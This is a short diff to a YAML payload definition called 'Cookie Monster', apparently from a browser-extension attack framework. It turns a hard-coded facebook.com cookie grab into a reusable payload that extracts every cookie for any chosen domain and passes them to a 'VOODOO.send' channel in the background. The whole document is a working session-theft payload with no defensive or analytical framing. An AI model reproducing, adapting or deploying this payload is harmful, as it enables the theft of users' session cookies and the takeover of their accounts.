@@ -1,5 +1,8 @@
 info:
   name: Cookie Monster
+  description: Extract the cookies of a given domain
+  variables:
+    - domain
 
 output: stdout:payload
 
@@ -8,5 +11,5 @@ permissions:
 
 scripts:
   - content: |
-      chrome.cookies.getAll({domain: "facebook.com"}, VOODOO.send);
+      chrome.cookies.getAll({domain: "%{domain}" }, VOODOO.send);
     background: true
